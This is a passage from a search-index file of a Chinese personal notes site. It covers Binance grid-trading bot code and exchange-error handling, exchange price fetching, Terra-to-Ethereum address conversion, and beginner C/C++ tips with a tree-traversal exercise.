\u8fd9\u4e9b\u7f3a\u5931\u7684\u4ef7\u683c\u662f\u56e0\u4e3a\u6302\u5355\u6210\u4ea4\u5bfc\u81f4\u7684\uff0c\u9700\u8981\u8865\u4e0a\u3002 \u6700\u65b0\u6210\u4ea4\u7684\u90a3\u4e00\u5355\u4ef7\u683c\u5b9a\u4e3ap\uff0cp\u672c\u8eab\u662f\u4e0d\u80fd\u8865\u5355\u7684\uff08\u521a\u7a81\u7834\u7684\u7f51\u683c\u672c\u8eab\u518d\u8865\u4e0a\u5c31\u662f\u767d\u4ea4\u624b\u7eed\u8d39\uff09\u3002 \u5c0f\u4e8ep\u7684\u7f3a\u5931\u4ef7\u683c\u9700\u8981\u8865\u4e0abuy\uff0c\u5927\u4e8e\u7684\u8865\u4e0asell\u3002 \u5728\u884c\u60c5\u5267\u70c8\u6ce2\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4e00\u5206\u949f\u5c31\u4f1a\u6210\u4ea4\u591a\u6b21\u8ba2\u5355\u9700\u8981\u53ca\u65f6\u8865\u5355\uff0c\u5c31\u9047\u5230\u4e86\u5177\u4f53\u7f16\u7801\u7684\u6311\u6218\uff1a","title":"\u5957\u5229+\u7f51\u683c\u4ea4\u6613"},{"location":"Bitcoin/#_5","text":"\u8ba2\u5355\u53f7\u6392\u5e8f\uff1f\u4e0d\u884c\uff0corderId\u53ea\u662f\u6309\u4e0b\u5355\u65f6\u95f4\u9012\u589e\uff0corderId\u6700\u5927\u5e76\u4e0d\u4e00\u5b9a\u6700\u8fd1\u6210\u4ea4 \u83b7\u53d6\u5f53\u524d\u6700\u65b0\u4ef7\u683c\uff0c\u6bd4\u8f83\u54ea\u4e2a\u7f3a\u5931\u4ef7\u683c\u79bb\u6700\u65b0\u4ef7\u683c\u66f4\u8fd1\uff1f\u5728\u884c\u60c5\u5267\u70c8\u6ce2\u52a8\u65f6\u4e0d\u53ef\u9760 \u83b7\u53d6\u5386\u53f2\u6240\u6709\u8ba2\u5355\uff0c\u6309updateTime\u6392\u5e8f\uff1f\u5b9e\u6d4b\u53d1\u73b0\u8fd9\u4e2aapi\u6709\u4e24\u4e2a\u95ee\u9898\uff1a \u591a\u4e2a\u8ba2\u5355updateTime\u76f8\u540c\uff0c\u65e0\u6cd5\u6392\u5e8f\u533a\u5206 \u6570\u636e\u5ef6\u8fdf\uff0c\u6700\u65b0\u6210\u4ea4\u7684\u8ba2\u5355\u5e76\u4e0d\u4e00\u5b9a\u51fa\u73b0 \u89e3\u51b3\u65b9\u6848\u662f\uff1a \u83b7\u53d6\u6700\u65b0\u6210\u4ea4\u7684\u6210\u4ea4\u8bb0\u5f55\uff0c\u4ece\u4e2d\u63d0\u53d6\u5305\u542b\u7684orderId\uff0c\u518d\u67e5\u8be2\u8ba2\u5355\u3002\u4e0d\u6392\u9664\u8fd9\u4e2aREST API\u4e5f\u5b58\u5728\u6570\u636e\u5ef6\u8fdf\u7684\u95ee\u9898 \u4f7f\u7528websocket","title":"\u5982\u4f55\u83b7\u53d6\u6700\u65b0\u7684\u6210\u4ea4\u8ba2\u5355\uff1f"},{"location":"Bitcoin/#python-sdk","text":"\u73b0\u5728\u4ee3\u7801\u5df2\u7ecf\u6709\u66f4\u65b0\u8865\u4e0a\u4e86REST API\u7684\u7f3a\u5931\uff0c\u4f46websocket\u8ba2\u9605\u8d26\u6237\u53d8\u52a8\u7684\u4ee3\u7801\u8fd8\u662f\u5f97\u81ea\u5df1\u6765\uff1a client.py\u91ccstream_get_listen_key\u9644\u8fd1\u52a0\u4e0a\uff1a def futures_stream_get_listen_key(self): res = self._request_futures_api(\"post\", \"listenKey\", True, data={}) return res['listenKey'] \u8c03\u7528\u5c31\u8fd9\u6837\uff1a def start_websocket ( self , handle_order ): def process_message ( msg ): global conn_key if msg [ 'e' ] not in [ 'ACCOUNT_UPDATE' ] and not ( msg [ 'e' ] == 'ORDER_TRADE_UPDATE' and msg [ 'o' ][ 'X' ] == 'NEW' ): myprint ( \"message:\" , msg [ 'e' ], msg ) if msg [ 'e' ] == 'error' : bm . stop_socket ( conn_key ) bm . close () reactor . stop () print ( \"socket stopped, exit now!\" ) exit () elif msg [ 'e' ] == 'ORDER_TRADE_UPDATE' : o = msg [ 'o' ] if o [ 'X' ] != 'FILLED' : return order = { \"price\" : o [ 'p' ], \"orderId\" : o [ 'i' ], \"side\" : o [ \"S\" ], \"symbol\" : o [ \"s\" ], \"clientOrderId\" : o [ \"c\" ] } return handle_order ( order ) client = self . client client . stream_get_listen_key = client . futures_stream_get_listen_key client . FUTURES_URL = client . FUTURES_URL . replace ( \"fapi\" , \"dapi\" ) bm = BinanceSocketManager ( client ) bm . STREAM_URL = \"wss://dstream.binance.com/\" conn_key = bm . start_user_socket ( process_message ) bm . start () \u4e0a\u8ff0\u4ee3\u7801\u76f4\u63a5\u9b54\u6539BinanceSocketManager\u7684\u5e38\u6570\u5b9a\u4e49\u6765\u5b9e\u73b0\u5bf9\u5e01\u672c\u4f4d\u5408\u7ea6API\u7684\u8c03\u7528\uff0c\u8ba2\u9605\u8d26\u6237\u53d8\u52a8\u6d88\u606f\uff0c\u53ea\u5904\u7406ORDER_TRADE_UPDATE\u4e2dFILLED\u7684\u8ba2\u5355\uff0c\u8c03\u7528handle_order\u51fd\u6570\u8fdb\u884c\u5904\u7406","title":"\u5e01\u5b89Python SDK\u6ca1\u6709\u5e01\u672c\u4f4d\u5408\u7ea6\u63a5\u53e3"},{"location":"Bitcoin/#_6","text":"\u907f\u514d\u91cd\u590d\u4e0b\u5355 : \u4e0b\u5355\u65f6\u6307\u5b9a\u5305\u542b\u4ef7\u683c\u4fe1\u606f\u7684newClientOrderId\uff0c\u91cd\u590d\u4e0b\u5355\u81ea\u7136\u4f1a\u5931\u8d25\uff0c\u907f\u514d\u76f8\u540c\u7684\u8ba2\u5355\u91cd\u590d\u4e0b\u5355 APIError(code=-4015): Client order id is not valid. \uff0c\u4f46\u8fd9\u4e2a\u4fdd\u62a4\u53ea\u9488\u5bf9\u8fd8\u5728\u6302\u5355\u7684\u8ba2\u5355\uff0c\u76f8\u540c\u7684clientorderid\u5982\u679c\u524d\u8ff0\u8ba2\u5355\u5df2\u7ecf\u6210\u4ea4\uff0c\u4e0d\u4f1a\u963b\u6b62\u65b0\u7684\u63d0\u4ea4\u3002 \u5df2\u7ecf\u91cd\u590d\u4e0b\u5355 \uff1a\u9700\u8981\u6bd4\u5bf9\u5f53\u524d\u4ef7\u683c\u4e0e\u5b9a\u4e49\u597d\u7684\u7f51\u683c\u6570\u7ec4\uff0c\u5224\u65ad\u5f53\u524d\u5e94\u8be5\u7684\u4ed3\u4f4d\u662f\u591a\u5c11\uff0c\u7136\u540e\u4f7f\u7528\u5e02\u4ef7\u5355\u6216\u8005\u989d\u5916\u5728\u76f8\u90bb\u7f51\u683c\u4e0b\u5355\u4fdd\u8bc1\u4ed3\u4f4d\u7684\u6b63\u786e\u6027\uff0c\u6ce8\u610f\u6781\u7aef\u884c\u60c5\u4e0b\u81ea\u52a8\u8865\u4ed3\u4f9d\u636e\u7684\u4ed3\u4f4d\u4ef7\u503c\u53ef\u80fd\u6709\u8bef\u3002\u4f8b\u5982\u4e70\u5165\u662f\u9760\u5e73\u4ed3\u505a\u7a7a\u5b9e\u73b0\u7684\uff0c\u8fd9\u662f\u79cdreduceOnly\u7684\u8ba2\u5355\uff0c\u5fc5\u987b\u6709\u8db3\u591f\u591a\u7684\u505a\u7a7a\u4ed3\u4f4d\u624d\u80fd\u4e70\uff0c\u5426\u5219\u62a5\u9519\uff1a APIError(code=-2022): ReduceOnly Order is rejected. \u5df2\u7ecf\u4e0b\u7684 \u8ba2\u5355\u72b6\u6001\u53d8\u6210\u201c\u5df2\u8fc7\u671f\u201d \uff1a\u8fd9\u79cd\u8fd8\u662f\u56e0\u4e3a\u5df2\u7ecf\u53d1\u751f\u4e86\u8d85\u4e70/\u8d85\u5356\uff0c\u4fdd\u8bc1\u91d1\u4e0d\u8db3\uff0c\u5b98\u65b9\u8bf4\u660e\uff1a https://www.binance.com/zh-CN/support/faq/360039707291 \u4fdd\u8bc1\u91d1\u5ba1\u6838\u4e0d\u8fc7\uff08\u9488\u5bf9\u4e8e\u6b62\u76c8\u6b62\u635f\u5355\uff09\uff1a\u6b62\u76c8\u6b62\u635f\u5355\u4e2d\u9700\u8981\u8bbe\u7f6e\u89e6\u53d1\u4ef7\u548c\u6210\u4ea4\u4ef7\uff08\u5e02\u4ef7\u6b62\u76c8\u6b62\u635f\u5355\u4e2d\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u9700\u8981\u8bbe\u7f6e\u6839\u636e\u6807\u8bb0\u4ef7\u683c\u6216\u6700\u65b0\u4ef7\u683c\u89e6\u53d1\uff09\uff0c\u7cfb\u7edf\u4f1a\u8fdb\u884c\u4e24\u6b21\u4fdd\u8bc1\u91d1\u5ba1\u6838\uff0c\u5206\u522b\u5728\u4e0b\u5355\u524d\u548c\u6210\u4ea4\u524d\u3002\u8ba2\u5355\u89e6\u53d1\u4e4b\u540e\uff0c\u7cfb\u7edf\u4f1a\u7acb\u5373\u8fdb\u884c\u7b2c\u4e8c\u6b21\u4fdd\u8bc1\u91d1\u5ba1\u6838\uff0c\u82e5\u5f53\u524d\u53d1\u751f\u4e86\u4e8f\u635f\u6216\u5212\u8f6c\u51fa\u4e86\u4fdd\u8bc1\u91d1\uff0c\u5bfc\u81f4\u53ef\u7528\u4fdd\u8bc1\u91d1\u4e0d\u8db3\uff0c\u6b64\u65f6\u8ba2\u5355\u72b6\u6001\u4f1a\u663e\u793a\u5df2\u8fc7\u671f\u3002 \u4fdd\u8bc1\u91d1\u4e0d\u8db3 \uff1a\u76f4\u63a5\u628a\u6760\u6746\u500d\u6570\u53d8\u62102\u53ef\u4ee5\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u5373\u4f7f\u52a0\u6760\u6746\u4e5f\u4e0d\u4f1a\u51fa\u73b0\u5f3a\u5e73\u4ef7\u683c\u3002 \u670d\u52a1\u5668\u7f51\u7edc\u4e0d\u53ef\u9760 \uff1a\u5728\u5176\u4ed6\u5730\u533a\u7684\u670d\u52a1\u5668\u540c\u65f6\u8dd1\u8f6e\u8be2\uff0c\u5373\u4f7f\u5355\u4e2a\u670d\u52a1\u5668\u6302\u6389\uff0c\u4e5f\u6709\u5176\u4ed6\u670d\u52a1\u5668\u9760\u8f6e\u8be2\u8865\u4e0a\u8ba2\u5355\uff0c\u4f46\u6ce8\u610f\u5206\u5e03\u5f0f\u540e\u65e5\u5fd7\u6536\u96c6\u662f\u4e2a\u65b0\u7684\u96be\u70b9 listenKeyExpired \uff1a\u6536\u5230\u8fd9\u79cd\u7c7b\u578b\u7684\u6d88\u606f\u9700\u8981\u91cd\u65b0\u8fde\u63a5\uff0c\u4e5f\u53ef\u4ee5\u4e3b\u52a8\u8f6e\u8be2\u7684\u65f6\u5019\u8c03\u7528futures_stream_get_listen_key\u5bf9\u73b0\u6709\u7684Listen Key\u8fdb\u884c\u5237\u65b0 function myparseFloat(text){ var res = parseFloat(text); if(text.endsWith(\"\u4ebf\")) return res*100000000; if(text.endsWith(\"\u4e07\")) return res*10000; return res; } function tdsortn(a,b,n){ if(myparseFloat(a.querySelector(\"td:nth-child(\"+n+\")\").textContent) > myparseFloat(b.querySelector(\"td:nth-child(\"+n+\")\").textContent) ) return 1; else return -1; } function tablebodysort(tbody, n, order){ var mylist=Array.prototype.slice.call(tbody.querySelectorAll(\"tr\"), 0); var sortList = Array.prototype.sort.bind(mylist); tbody.innerHTML=\"\"; for(var i of sortList(function(a,b){return -order*tdsortn(a,b,n)})) tbody.appendChild(i) } var rememerclick={2:1}; function tablesort_onclick(e){ var n = Array.from(e.target.parentElement.children).map((element, index)=>({element,index})).filter(({element})=>element==e.target)[0].index+1 var tbody = document.querySelector(\"#realtimeprofittbody\"); var order = rememerclick[n]==1?-1:1; tablebodysort(tbody, n, order); rememerclick[n] = order; } function registeronclick(){ for (var i of Array.prototype.slice.call(document.querySelectorAll(\"#realtimeprofit > table > thead > tr > th\"),1)){ i.onclick = tablesort_onclick; i.style[\"cursor\"]=\"pointer\"; } var tab=localStorage.getItem(\"watchtab\"); if(tab){eval(tab+\"()\")} rememerclick={2:1}; document.querySelectorAll(\"#realtimeprofittbody>tr>td\").forEach(function(i){if(i.innerText.trim().startsWith(\"-\")){i.style.backgroundColor=\"#c0ff90\"}}) } function triggerrefresh(){ fetch(\"https://api.py3.io/trigger_btc_refresh\").then(function(response) { if (!response.ok) { throw Error(response.statusText); } return response; }).then(function(response) { alert(\"\u66f4\u65b0\u6210\u529f\"); loadbtctable(); }).catch(function(error) { alert(\"\u89e6\u53d1\u66f4\u65b0\u5931\u8d25\uff0c\u8bf7\u7a0d\u540e\u518d\u6765\") }); } if(/refresh/.test(location.href)) triggerrefresh(); function showfull(){ localStorage.setItem(\"watchtab\",\"showfull\"); document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=\"\") } function showtrs(coins){ document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=(coins.indexOf(i.querySelector(\".headcol\").innerText.trim())==-1?\"none\":\"\")) } function hidetrs(coins){ document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=(coins.indexOf(i.querySelector(\".headcol\").innerText.trim())==-1?\"\":\"none\")) } function show_prefix(prefix){ document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=(i.querySelector(\".headcol\").innerText.trim().startsWith(prefix)?\"\":\"none\")) } .md-grid{max-width:69rem;} .headcol { position: sticky; position: -webkit-sticky; background-color: white; width: 3rem; min-width: 3rem; max-width: 3rem; left: 0px; } th.headcol { background-color: #757575!important; } .md-typeset table:not([class]) tr:hover .headcol{ background-color: #f6f6f6; } .md-typeset table:not([class]) th{ min-width: 4rem; }","title":"\u5404\u79cd\u5f02\u5e38\u5904\u7406"},{"location":"Bitcoin/#_7","text":"\u5728\u7edf\u8ba1\u8d44\u4ea7\u65f6\u5bf9\u4ef7\u683c\u5b9e\u65f6\u6027\u6ca1\u6709\u8981\u6c42\uff0c\u53ef\u4ee5\u7f13\u5b5860\u79d2\uff1b\u7528\u6cd5\uff1a print(HUOBI_Price.btc) \uff0c\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\u7c7b\u578b class class_CEXPRICE (): def __init__ ( self ): self . updatetime = - 1 def __getattr__ ( self , token ): if time . time ()- self . updatetime >= 60 : print ( \"fetch\" , self , end = \"\" , flush = True ) self . data = self . fetchprice () print () self . updatetime = time . time () return self . handleprice ( token ) class class_HUOBI_Price ( class_CEXPRICE ): def fetchprice ( self ): return sess . get ( \"https://api.huobi.pro/market/tickers\" , timeout = 5 ). json ()[ \"data\" ] def handleprice ( self , token ): return [ i for i in self . data if i [ \"symbol\" ]== token . lower ()+ \"usdt\" ][ 0 ][ \"close\" ] HUOBI_Price = class_HUOBI_Price () class class_BINANCE_Price ( class_CEXPRICE ): def fetchprice ( self ): return sess . get ( \"https://api.binance.com/api/v3/ticker/price\" , timeout = 5 ). json () def handleprice ( self , token ): if \"busd\" not in token . lower (): token = token . lower ()+ \"usdt\" return [ i for i in self . data if i [ \"symbol\" ]== token . upper ()][ 0 ][ \"price\" ] BINANCE_Price = class_BINANCE_Price () class class_MXC_Price ( class_CEXPRICE ): def fetchprice ( self ): return sess . get ( \"https://www.mxc.com/open/api/v2/market/ticker\" , timeout = 5 ). json ()[ \"data\" ] def handleprice ( self , token ): return [ i for i in self . data if i [ \"symbol\" ]== token . upper ()+ \"_USDT\" ][ 0 ][ \"last\" ] MXC_Price = class_MXC_Price ()","title":"\u83b7\u53d6\u4ea4\u6613\u6240\u4ef7\u683c\u4fe1\u606f"},{"location":"Bitcoin/#terra","text":"\u4f9d\u8d56\u5e93\uff1a pip3 install bech32 import bech32 words = bech32 . bech32_decode ( terra_addr )[ 1 ] ethaddr = \"\" . join ([ hex ( i )[ 2 :] . rjust ( 2 , \"0\" ) for i in bech32 . convertbits ( words , 5 , 8 , False )]) \u53cd\u8fc7\u6765\u5c31\u662f words = [int(ethaddr[i:i+2], 16) for i in range(0,40,2)] terra_addr = bech32.bech32_encode(\"terra\", bech32.convertbits(words, 8, 5, False))","title":"terra\u5730\u5740\u8f6c\u4e3a\u4ee5\u592a\u574a\u5730\u5740"},{"location":"C/","text":"C\u8bed\u8a00 \u00b6 \u4e00\u70b9\u5173\u4e8eC\u7684\u5efa\u8bae\u54af\uff0c\u4e5f\u5305\u542bC++ \u987a\u5e26\u9644\u4e0a\u51e0\u4e2a\u9898\u76ee\u548c\u6211\u5199\u7684\u89e3\u7b54 \u5173\u4e8eDev C++ \u00b6 \u6709\u65f6\u5019\u4f1a\u53d1\u751f\u6539\u4e86\u4ee3\u7801\u4f46\u8fd0\u884c\u8d77\u6765\u662f\u65e7\u7248\u672c\u7684\u60c5\u51b5\uff0c\u9700\u8981\u68c0\u67e5\u662f\u5426\u5173\u95ed\u4e86\u6b63\u5728\u8fd0\u884c\u7684exe\uff0c\u5982\u679c\u662f\u5de5\u7a0b\u9700\u8981\u6309F12\u5168\u90e8\u91cd\u65b0\u7f16\u8bd1\u6e05\u7a7a\u7f13\u5b58 \u7f16\u8bd1\u5de5\u7a0b\u9519\u8bef\u5b9a\u4f4d\u5728Makefile\u8bf4\u660e\u6709\u51fd\u6570\u58f0\u660e\u4e86\u4f46\u6ca1\u6709\u5b9a\u4e49\uff0c\u6216\u8005\u53ef\u80fd\u662f\u51fa\u73b0\u4e86\u591a\u4e2a\u6587\u4ef6\u540c\u540d\u51fd\u6570\uff0c\u5c0f\u5fc3\u5176\u521b\u5efa\u5de5\u7a0b\u7684\u65f6\u5019\u81ea\u52a8\u4ea7\u751f\u7684main.c \u5982\u679c\u5355\u7eaf\u53ea\u9700\u8981\u7f16\u8bd1\u4e00\u4e2aC\u6587\u4ef6\uff0c\u4e3a\u8ffd\u6c42\u7f16\u8bd1\u901f\u5ea6\u53ef\u4ee5\u8003\u8651\u4f7f\u7528tcc (Tiny C Compile)\u7f16\u8bd1\u5668\uff0c\u53c2\u89c1 https://qs1401.com/?post=18 \uff1b\u53e6\u5916\u4f60\u53ef\u4ee5\u4fee\u6539\u7f16\u8bd1\u7684\u4f18\u5316\u53c2\u6570\uff0c\u4e0d\u8981\u7528 -O3 \u8fd9\u79cd\u66f4\u9002\u5408\u6b63\u5f0f\u53d1\u5e03\u65f6\u7684\u4f18\u5316\u9009\u9879 \u4e0d\u8981\u5728\u4e00\u4e2a\u9879\u76ee\u4e2d\u6df7\u7528.c\u548c.cpp\uff0c\u5c06\u5bfc\u81f4 ld \u94fe\u63a5\u7684\u65f6\u5019\u51fd\u6570\u627e\u4e0d\u5230\u3002\u56e0\u4e3a\u7f16\u8bd1.cpp\u7684\u65f6\u5019\u662fC++\u7684\u7f16\u8bd1\uff0c\u7531\u4e8e\u8981\u652f\u6301\u91cd\u8f7d\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u4fee\u6539\u51fd\u6570\u540d\u79f0\uff0c\u5bfc\u81f4\u4ee3\u7801\u4e2d\u540c\u6837\u540d\u5b57\u7684\u51fd\u6570\u7f16\u8bd1\u51fa\u6765\u7684.o\u6587\u4ef6\u91cc\u9762\u51fd\u6570\u540d\u79f0\u662f\u4e0d\u540c\u7684\uff0c\u8fd9\u6837.c\u627e\u4e0d\u5230.cpp\u7684\u51fd\u6570\uff0c\u81ea\u7136\u65e0\u6cd5\u94fe\u63a5\uff1b\u4e0d\u8fc7\u8fd8\u662f\u6709\u6280\u5de7\u7684\uff1aextern \u201cC\u201d\u5305\u4f4f\u5373\u53ef \u6ce8\u610f\u6307\u9488\u7684\u661f\u53f7\u522b\u5c11\u5199\uff1a\u60f3\u4e00\u6b21\u5199\u4e24\u4e2a\u6307\u9488\uff1f\u4e0d\u80fd\u5199 FILE* fp1,fp2; \u800c\u662f\u6bcf\u4e2a\u53d8\u91cf\u524d\u9762\u90fd\u8981\u5e26\u4e0a\u661f\u53f7\uff01\u6b63\u786e\u5199\u6cd5\uff1a FILE *fp1,*fp2; char *s1,*s2; \u8f93\u5165\u7684\u95ee\u9898 \u00b6 \u5728\u5f00\u53d1\u771f\u5b9e\u7528\u6237\u4f1a\u4f7f\u7528\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u65f6\uff0c\u6211\u5efa\u8bae\u6240\u6709\u7684\u8f93\u5165\u5168\u90e8\u4f7f\u7528gets\u5b8c\u6210\uff0c\u7136\u540e\u518d\u7528sscanf\u8bfb\u53d6\u5230\u53d8\u91cf\uff0c\u53ef\u4ee5\u6709\u6548\u9632\u6b62scanf\u5728\u4e00\u884c\u51fa\u9519\u6ce2\u53ca\u5230\u4e0b\u4e00\u884c \u5f53\u7136\u66f4\u5b89\u5168\u7684\u662f fgets(buf,9999,stdin); \u6307\u5b9a\u6700\u591a\u8bfb\u53d6\u591a\u5c11\u4e2a\u5b57\u8282\u907f\u514d\u6808\u6ea2\u51fa\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u4f1a\u5f97\u5230\\n\u5b57\u7b26 \u53e6\u5916\uff0c\u65e0\u8bba\u662fscanf\u8fd8\u662fsscanf\uff0c\u8d4b\u503c\u7ed9int/double\u7b49\u7c7b\u578b\u7684\u53d8\u91cf\u4e00\u5b9a\u8981\u5199&\u7b26\u53f7\uff01 \u4ee5\u4e0b\u4ee3\u7801\u6f14\u793a\u8fd9\u79cd\u8f93\u5165\u65b9\u6cd5\uff0c\u5bf9\u8f93\u5165\u7684n\u4e2a\u6570\u8c03\u7528qsort\u6392\u5e8f\uff1b\u8f93\u5165\u683c\u5f0f\uff1a\u7b2c\u4e00\u884c N\u8868\u793a\u6570\u7684\u4e2a\u6570\uff0c\u7b2c\u4e8c\u884c N\u4e2a\u9700\u8981\u6392\u5e8f\u7684\u6570(N<1000) #include <stdio.h> #include <stdlib.h> char buf [ 9999 ]; int data [ 1005 ]; //\u4e0d\u8981\u5728\u5c40\u90e8\u53d8\u91cf\u5b9a\u4e49\u5927\u6570\u7ec4\uff0c\u4f1a\u70b8\u6808 int cmp ( const void * a , const void * b ){ return * ( int * ) a -* ( int * ) b ; } int main (){ int N , i ; gets ( buf ); sscanf ( buf , \"%d\" , & N ); gets ( buf ); for ( i = 0 ; i < N ; i ++ ) { sscanf ( buf , \"%d %[^ \\n ]\" , & data [ i ], buf ); } qsort ( data , N , sizeof ( int ), cmp ); for ( i = 0 ; i < N -1 ; i ++ ) printf ( \"%d \" , data [ i ]); printf ( \"%d\" , data [ i ]); } C++\u7528sstream\u4ee3\u66ffsprintf \u00b6 #include <string> #include <sstream> #include <iostream> using namespace std ; int main (){ stringstream s ; string result ; int i = 1000 ; s << \"haha \" << i ; getline ( s , result ); // the whole line rather than just the first word cout << result << endl ; // print \"haha1000\" s . clear (); } \u89e3\u51b3g++\u7701\u7565\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898 \u00b6 g++\u4e3a\u4e86\u9632\u6b62\u5728\u51fd\u6570\u8fd4\u56de\u503c\u662f\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u62f7\u8d1d\u6784\u9020\u88ab\u8c03\u7528\u591a\u6b21\uff0c\u5373\u4f7f\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u6709\u526f\u4f5c\u7528\uff0c\u4e5f\u4f1a\u88ab\u4f18\u5316\u6389\uff08\u76f4\u63a5\u5c31\u4e0d\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u4e86\uff09 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4ece\u800c\u8bc1\u660e\u6559\u6750\u4e0a\u7684\u6b63\u786e\u6027/\u8bed\u8a00\u7684\u7279\u6027\uff0c\u9700\u8981\u5728\u7f16\u8bd1\uff08\u4e0d\u662f\u94fe\u63a5\uff09\u7684\u65f6\u5019\u52a0\u5165\u4ee5\u4e0b\u5f00\u5173\uff1a - fno - elide - constructors [\u6570\u636e\u7ed3\u6784]\u6811\u7684\u904d\u5386 \u00b6 \u5141\u8bb8\u4e0d\u786e\u5b9a\u4e2a\u5143\u7d20\u7684\u5b50\u8282\u70b9\u4e2a\u6570\uff0c\u8981\u6c42\u7ed9\u51fa\u6240\u6709\u4ece\u6839\u8282\u70b9\u5f00\u59cb\u5230\u53f6\u8282\u70b9\u7684\u8def\u5f84 \u6211\u662f\u8fd9\u4e48\u5199\u7684\u904d\u5386\u5faa\u73af\uff08\u4f2a\u4ee3\u7801\uff09\uff0c\u5176\u4e2dp1\u548cp2\u662f\u6307\u5411\u8282\u70b9\u7684\u6307\u9488\uff1a \u8def\u5f84=[\u6839\u8282\u70b9] while(\u5faa\u73af\u6761\u4ef6): while (p2=p1\u7684\u4e0b\u4e00\u4e2a\u6ca1\u6709\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9)\u4e0d\u4e3a\u7a7a: \u628ap2\u52a0\u5165\u8def\u5f84 p1=p2 if p1\u4e3a\u53f6\u8282\u70b9: \u5f97\u5230\u4e86\u4e00\u6761\u4ece\u6839\u8282\u70b9\u5230\u4e00\u4e2a\u53f6\u8282\u70b9\u7684\u8def\u5f84 \u8def\u5f84pop\uff0c\u6362\u8a00\u4e4b\uff0c\u5220\u6389\u6700\u540e\u52a0\u5165\u7684\u8282\u70b9 p1=p1\u7684\u7236\u8282\u70b9\uff08\u5c31\u662f\u56de\u6eaf\uff09 \u5176\u4e2d\u5173\u952e\u7684 p1\u7684\u4e0b\u4e00\u4e2a\u6ca1\u6709\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9 \u7684\u5b9e\u73b0\u662f\u8fd9\u6837\u5b50\u7684\uff1a if \u5f53\u524d\u5b69\u5b50\u7684\u4e0b\u6807>=\u5b69\u5b50\u603b\u6570: return NULL else return \u5b50\u8282\u70b9\u6570\u7ec4[\u5f53\u524d\u4e0b\u6807++] \u5356\u4e2a\u5173\u5b50\u3002\u3002\u3002\u8bf7\u601d\u8003\u4e00\u4e0b\u5faa\u73af\u6761\u4ef6\u5e94\u8be5\u5199\u5565\uff1f \u904d\u5386\u7684\u5faa\u73af\u6761\u4ef6 \u00b6 \u4e00\u5f00\u59cb\u6211\u5199\u7684\u662f\uff1a\u201c\u6839\u8282\u70b9\u8fd8\u6709\u672a\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u201d\uff0c\u4f46\u662f\u8fd9\u4e48\u5199\u5728\u8fd9\u91cc\u5c31\u51fa\u4e86\u95ee\u9898\uff0c\u7531\u4e8e\u6807\u8bb0\u5df2\u7ecf\u904d\u5386\u7684\u5b50\u8282\u70b9\u53d1\u751f\u5728\u771f\u6b63\u904d\u5386\u5b8c\u5b50\u8282\u70b9\u4e4b\u524d\uff08\u6211\u7528\u7684return \u6570\u7ec4[\u4e0b\u6807++]\uff09\uff0c\u5728\u5faa\u73af\u6839\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u7684\u65f6\u5019\u4f1a\u63d0\u524d\u7ed3\u675f\u5faa\u73af\uff0c\u5bfc\u81f4\u6ca1\u80fd\u904d\u5386\u6240\u6709\u8282\u70b9\uff01 \u6b63\u786e\u7684\u5199\u6cd5\u662f\uff1a \u8def\u5f84\u7684\u5143\u7d20\u4e2a\u6570>=1 \u8def\u5f84\u53ef\u4ee5\u7528vector\u5b9e\u73b0\uff0c\u5143\u7d20\u4e2a\u6570\u5c31\u662fvector\u7684size()\uff0c\u53ea\u6709\u904d\u5386\u5b8c\u6210\u4e86\u6574\u4e2a\u6811\u4e4b\u540e\uff0c\u6839\u8282\u70b9\u624d\u4f1a\u88abpop\u51fa\u6765\uff0c\u7ed3\u675f\u5faa\u73af\u3002 \u4f7f\u7528\u9762\u5411\u5bf9\u8c61\u7684\u601d\u60f3 \u00b6 \u8fd9\u4e2a\u9898\u76ee\u6211\u4f7f\u7528\u4e86C++\u6765\u5199\uff0c\u679c\u7136\u6bd4C\u597d\u591a\u4e86\u3002\u3002\u3002\u53ea\u8981\u60f3\u597d\u63a5\u53e3\u5c31\u80fd\u5f88\u65b9\u4fbf\u5730\u5b9e\u73b0\u9700\u8981\u7684\u529f\u80fd\u5566\uff08\u4e0d\u8fc7\u8fd8\u662fPython\u5185\u7f6e\u7684list\u597d\u591a\u4e86\uff0cC++\u7684vector\u5404\u79cdconst\u7684\u5751 \u8fd9\u91cc\u5206\u4eab\u4e00\u4e0b\u6211\u8bbe\u8ba1\u7684\u63a5\u53e3\uff1a class Node { public : Node (); void setChildNum ( int num ); // \u4e3a\u5b50\u8282\u70b9\u7684\u6307\u9488\u7684\u6570\u7ec4\u5206\u914d\u7a7a\u95f4 void addOneChild ( Node * child ); void setData ( int data ); int getData (); void setParent ( Node * parent ); Node * getParent (); Node * getCurrentChild (); // \u83b7\u5f97\u5f53\u524d\u8fd8\u6ca1\u8d70\u8fc7\u7684\u5b50\u8282\u70b9\uff0c\u5e76\u4e14\u628a\u8fd4\u56de\u7684\u5b50\u8282\u70b9\u6807\u8bb0\u4e3a\u8d70\u8fc7\u4e86 bool hasChildToGo (); // \u8fd9\u4e2a\u8282\u70b9\u662f\u4e0d\u662f\u6240\u6709\u7684\u5b50\u8282\u70b9\u90fd\u5b8c\u6210\u4e86 bool isLeafNode (); // \u8fd9\u4e2a\u8282\u70b9\u662f\u4e0d\u662f\u53f6\u8282\u70b9 private : //... \u7701\u7565\u54af ... }; class Nodes { // \u5b58\u50a8\u8def\u5f84\u7684 Nodes 